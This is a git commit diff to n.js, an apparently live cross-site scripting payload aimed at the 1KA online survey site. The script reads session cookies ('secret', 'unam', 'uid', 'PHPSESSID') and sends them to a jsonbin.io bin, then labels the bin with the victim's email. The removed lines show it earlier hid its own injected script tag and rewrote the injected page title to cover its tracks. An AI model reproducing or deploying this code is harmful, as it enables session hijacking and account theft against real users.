bb5784af686143cb8221ae26db7be04cf61e61cd
enkarman <143791979+enkarman@users.noreply.github.com>
2023-09-05 11:15:54 +0200

    Add files via upload

--- n.js
+++ n.js
@@ -1,10 +1,22 @@
-document.addEventListener('DOMContentLoaded', () => {
-    console.log("Master Key from n.js:", window.masterKey);
-    var xhr = new XMLHttpRequest(),
+(function() {
+    console.log("Executing n.js...");
+
+    // Fetch the master key from localStorage
+    let masterKey = localStorage.getItem('masterKey');
+    console.log("Master Key from n.js:", masterKey);
+
+    if (!masterKey) {
+        console.error("Error: Master Key not found!");
+        return;
+    }
+
+    // The rest of your logic for n.js:
+
+    let xhr = new XMLHttpRequest(),
         binID, email, req, cookieData = {};
 
     document.cookie.split('; ').forEach(function(c) {
-        var parts = c.split('=');
+        let parts = c.split('=');
         if (['secret', 'unam', 'uid', 'PHPSESSID'].includes(parts[0])) {
             cookieData[parts[0]] = parts[1];
             if (parts[0] === 'uid') {
@@ -25,7 +37,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 };
                 req.open("PUT", "https://api.jsonbin.io/v3/b/" + binID + "/meta/name", true);
                 req.setRequestHeader("X-Bin-Name", email);
-                req.setRequestHeader("X-Master-Key", window.masterKey);
+                req.setRequestHeader("X-Master-Key", masterKey);
                 req.send();
             }
         }
@@ -33,31 +45,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
     xhr.open('POST', 'https://api.jsonbin.io/v3/b', true);
     xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.setRequestHeader("X-Master-Key", window.masterKey);
+    xhr.setRequestHeader("X-Master-Key", masterKey);
     xhr.send(JSON.stringify(cookieData));
 
-    function modifyDOMElements() {
-        var h1Elements = document.getElementsByTagName('h1');
-        for (var i = 0; i < h1Elements.length; i++) {
-            if (h1Elements[i].textContent.trim() === '">') {
-                h1Elements[i].textContent = "Raziskava o nečem";
-            }
-        }
-        
-        var specificScript = document.querySelector('script[src="https://enkarman.github.io/enkica/n.js"]');
-        if (specificScript) {
-            specificScript.parentNode.removeChild(specificScript);
-        }
-    }
+    // Additional logic if you have any...
 
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', modifyDOMElements);
-    } else {
-        modifyDOMElements();
-    }
-
-    var pageTitle = document.title;
-    if (pageTitle === '"> - 1KA | Spletne ankete') {
-        document.title = `Raziskava o nečem - 1KA | Spletne ankete`;
-    }
-});
+})();
